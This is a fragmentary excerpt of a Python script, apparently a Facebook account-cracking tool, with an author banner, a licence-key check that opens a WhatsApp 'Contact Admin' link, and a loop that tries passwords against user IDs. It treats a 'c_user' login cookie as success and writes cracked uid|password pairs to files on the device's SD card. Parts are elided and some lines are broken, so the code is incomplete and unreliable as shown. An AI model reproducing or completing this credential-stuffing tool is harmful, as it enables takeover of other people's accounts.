...
\033[1;32m[-] GITHUB    :\033[1;32m SAMIR-CYBER-71
\033[1;32m[-] FACEBOOK  :\033[1;32m black man
\033[1;92m══════════════════════════════════════════
...
if key2 in b:
    ...
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    os.system('xdg-open https://wa.me/+8801731787002')
    exit()
class Main:
    def __init__(self):
        self.id = []
        ...
        os.system("clear")
        print(logo)
        os.system('https://facebook.com/groups/1971604019888428/?ref=share&mibextid=NSMWBT')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/alom-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
               ...
               # print(f"\x1b[38;5;196m[SAMIR-CP💔] {uid}|{ps}")
                open('/sdcard/SAMIR-CP.txt', 'a').write( uid+' | '+ps+' \R')
                cps.append(uid)
                break
            else:
                continue
